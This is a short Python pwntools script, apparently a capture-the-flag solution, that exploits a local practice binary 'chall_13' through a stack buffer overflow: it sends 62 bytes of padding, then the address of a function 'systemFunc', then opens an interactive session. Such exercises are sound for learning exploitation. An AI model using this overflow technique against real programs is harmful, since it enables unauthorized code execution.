from pwn import *

def main():
	binary = context.binary = ELF("./chall_13")
	p = process("./chall_13")
	print(p.recv())
	p.sendline()
	payload = ((58 + 4) * "A").encode() + p32(binary.sym.systemFunc)
	p.sendline(payload)
	p.interactive()
main()
